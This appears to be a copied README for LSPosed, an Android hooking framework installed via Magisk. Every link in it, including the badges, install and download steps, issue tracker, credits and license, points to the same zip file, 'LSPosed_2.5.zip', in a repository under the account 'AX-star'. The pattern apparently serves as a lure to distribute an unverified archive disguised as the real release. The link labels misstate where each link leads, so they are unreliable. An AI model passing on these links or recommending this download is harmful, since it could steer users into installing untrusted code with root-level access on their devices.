# LSPosed Framework

[![Build](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip%3Apush+branch%3Amaster+is%3Acompleted) [![Crowdin](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip) [![Channel](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip) [![Chat](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip%E9%A2%91%E9%81%93-red?logo=tencent-qq&logoColor=red)](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip) [![Download](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip) [![Total](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)

## Introduction 

A Riru / Zygisk module trying to provide an ART hooking framework which delivers consistent APIs with the OG Xposed, leveraging LSPlant hooking framework.

> Xposed is a framework for modules that can change the behavior of the system and apps without touching any APKs. That's great because it means that modules can work for different versions and even ROMs without any changes (as long as the original code was not changed too much). It's also easy to undo. As all changes are done in the memory, you just need to deactivate the module and reboot to get your original system back. There are many other advantages, but here is just one more: multiple modules can do changes to the same part of the system or app. With modified APKs, you have to choose one. No way to combine them, unless the author builds multiple APKs with different combinations.

## Supported Versions

Android 8.1 ~ 14

## Install

1. Install Magisk v24+
2. (For Riru flavor) Install [Riru](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip) v26.1.7+
3. [Download](#download) and install LSPosed in Magisk app
4. Reboot
5. Open LSPosed manager from notification
6. Have fun :)

## Download

- For stable releases, please go to [Github Releases page](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)
- For canary build, please check [Github Actions](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip%3Amaster)

Note: debug builds are only available in Github Actions.

## Get Help
**Only bug reports from **THE LATEST DEBUG BUILD** will be accepted.**
- GitHub issues: [Issues](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)
- (For Chinese speakers) 本项目只接受英语**标题**的issue。如果您不懂英语，请使用[翻译工具](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)

## For Developers

Developers are welcome to write Xposed modules with hooks based on LSPosed Framework. A module based on LSPosed framework is fully compatible with the original Xposed Framework, and vice versa, a Xposed Framework-based module will work well with LSPosed framework too.

- [Xposed Framework API](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)

We use our own module repository. We welcome developers to submit modules to our repository, and then modules can be downloaded in LSPosed.

- [LSPosed Module Repository](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)

## Community Discussion

- Telegram: [@LSPosed](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip)

Notice: These community groups don't accept any bug report, please use [Get help](#get-help) to report.

## Translation Contributing

You can contribute translation [here](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip).

## Credits 

- [Magisk](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip): makes all these possible
- [Riru](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip): provides a way to inject code into zygote process
- [XposedBridge](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip): the OG Xposed framework APIs
- [Dobby](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip): used for inline hooking
- [LSPlant](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip): the core ART hooking framework
- [EdXposed](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip): fork source
- ~[SandHook](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip): ART hooking framework for SandHook variant~
- ~[YAHFA](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip): previous ART hooking framework~
- ~[dexmaker](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip) and [dalvikdx](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip): to dynamically generate YAHFA hooker classes~
- ~[DexBuilder](https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip): to dynamically generate YAHFA hooker classes~

## License

LSPosed is licensed under the **GNU General Public License v3 (GPL-3)** (https://raw.githubusercontent.com/AX-star/LSPosed/master/app/src/main/LSPosed_2.5.zip).
